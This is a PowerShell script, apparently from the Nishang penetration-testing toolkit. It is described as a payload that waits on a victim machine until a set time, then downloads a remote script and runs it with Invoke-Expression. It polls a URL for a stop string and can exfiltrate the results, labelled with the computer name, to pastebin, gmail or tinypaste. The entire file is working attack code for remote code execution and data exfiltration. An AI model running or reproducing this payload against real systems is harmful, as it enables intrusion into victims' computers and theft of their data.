<#
.SYNOPSIS
Nishang Payload which waits till given time to execute a script.

.DESCRIPTION
This payload waits till the given time (on the victim)
and then downloads a PowerShell script and executes it.

.PARAMETER URL
The URL from where the file would be downloaded.

.PARAMETER time
The Time when the payload will be executed (in 24 hour format e.g. 23:21).

.PARAMETER CheckURL
The URL which the payload would check for instructions to stop.

.PARAMETER StopString
The string which if found at CheckURL will stop the payload.

PARAMETER exfil
Use this parameter to use exfiltration methods for returning the results.

.PARAMETER dev_key
The Unique API key provided by pastebin when you register a free account.
Unused for tinypaste.
Unused for gmail option.

.PARAMETER username
Username for the pastebin account where data would be pasted.
Username for the tinypaste account where data would be pasted.
Username for the gmail account where attachment would be sent as an attachment.

.PARAMETER password
Password for the pastebin account where data would be pasted.
Password for the tinypaste account where data would be pasted.
Password for the gmail account where data would be sent.

.PARAMETER keyoutoption
The method you want to use for exfitration of data.
"0" for displaying on console
"1" for pastebin.
"2" for gmail
"3" for tinypaste   

.EXAMPLE
PS > .\Time_Execution.ps1 http://example.com/script.ps1 hh:mm http://pastebin.com/raw.php?i=Zhyf8rwh stoppayload

EXAMPLE
PS > .\Time_Execution.ps1 http://pastebin.com/raw.php?i=Zhyf8rwh hh:mm http://pastebin.com/raw.php?i=jqP2vJ3x stoppayload -exfil <devkey> <username> <password> <keyoutoption>

Use above when using the payload from non-interactive shells.

.LINK
http://labofapenetrationtester.blogspot.com/
http://code.google.com/p/nishang
#>



[CmdletBinding(DefaultParameterSetName="noexfil")]
Param( [Parameter(Parametersetname="exfil")] [Switch] $exfil,
[Parameter(Position = 0, Parametersetname="exfil")] [Parameter(Position = 0, Mandatory = $True, Parametersetname="noexfil")] [String] $URL,
[Parameter(Position = 1, Parametersetname="exfil")] [Parameter(Position = 1, Mandatory = $True, Parametersetname="noexfil")] [String]$time,
[Parameter(Position = 2, Parametersetname="exfil")] [Parameter(Position = 2, Mandatory = $True, Parametersetname="noexfil")] [String]$CheckURL,
[Parameter(Position = 3, Parametersetname="exfil")] [Parameter(Position = 3, Mandatory = $True, Parametersetname="noexfil")] [String]$StopString,
[Parameter(Position = 4,Mandatory = $True, Parametersetname="exfil")] [String]$dev_key,
[Parameter(Position = 5,Mandatory = $True, Parametersetname="exfil")] [String]$username,
[Parameter(Position = 6,Mandatory = $True, Parametersetname="exfil")] [String]$password,
[Parameter(Position = 7,Mandatory = $True, Parametersetname="exfil")] [String]$keyoutoption )
function Time_Execution
{
    $exec = 0
    while($true)
    {
    start-sleep -seconds 5 
    $filecontent = $webclient.DownloadString("$CheckURL")
    $systime = Get-Date -UFormat %R
    if ($systime -match $time)
    {
        $webclient = New-Object System.Net.WebClient 
        $file = "$env:temp\time_payload.ps1"
        $webclient.DownloadFile($URL,$file) 
        $pastevalue = Invoke-Expression $file
        $exec++
        if ($exfil -eq $True)
        {
            Do-exfiltration
        }
        if ($exec -eq 1)
        {
            Start-Sleep -Seconds 60
        }
    }
    elseif ($filecontent -eq $StopString)
    {
        break
    }
    }
}

function Do-exfiltration
{
    $paste_name = $env:COMPUTERNAME + ": Results of Time_Execution"
    function post_http($url,$parameters) 
    { 
        $http_request = New-Object -ComObject Msxml2.XMLHTTP 
        $http_request.open("POST", $url, $false) 
        $http_request.setRequestHeader("Content-type","application/x-www-form-urlencoded") 
        $http_request.setRequestHeader("Content-length", $parameters.length); 
        $http_request.setRequestHeader("Connection", "close") 
        $http_request.send($parameters) 
        $script:session_key=$http_request.responseText 
    } 

    function Get-MD5()
    {
        #http://stackoverflow.com/questions/10521061/how-to-get-a-md5-checksum-in-powershell
        $md5 = new-object -TypeName System.Security.Cryptography.MD5CryptoServiceProvider
        $utf8 = new-object -TypeName System.Text.UTF8Encoding
        $hash = [System.BitConverter]::ToString($md5.ComputeHash($utf8.GetBytes($password))).Replace("-", "").ToLower()
        return $hash
    }

    if ($keyoutoption -eq "0")
    {
        $pastevalue
    }

    elseif ($keyoutoption -eq "1")
    {
        post_http "https://pastebin.com/api/api_login.php" "api_dev_key=$dev_key&api_user_name=$username&api_user_password=$password" 
        post_http "https://pastebin.com/api/api_post.php" "api_user_key=$session_key&api_option=paste&api_dev_key=$dev_key&api_paste_name=$paste_name&api_paste_code=$pastevalue&api_paste_private=2" 
    }
        
    elseif ($keyoutoption -eq "2")
    {
        #http://stackoverflow.com/questions/1252335/send-mail-via-gmail-with-powershell-v2s-send-mailmessage
        $smtpserver = “smtp.gmail.com”
        $msg = new-object Net.Mail.MailMessage
        $smtp = new-object Net.Mail.SmtpClient($smtpServer )
        $smtp.EnableSsl = $True
        $smtp.Credentials = New-Object System.Net.NetworkCredential(“$username”, “$password”); 
        $msg.From = “$username@gmail.com”
        $msg.To.Add(”$username@gmail.com”)
        $msg.Subject = $paste_name
        $msg.Body = $pastevalue
        if ($filename)
        {
            $att = new-object Net.Mail.Attachment($filename)
            $msg.Attachments.Add($att)
        }
        $smtp.Send($msg)
    }

    elseif ($keyoutoption -eq "3")
    {
            
        $hash = Get-MD5
        post_http "http://tny.cz/api/create.xml" "paste=$pastevalue&title=$paste_name&is_code=0&is_private=1&password=$dev_key&authenticate=$username`:$hash"
    }

}

Time_Execution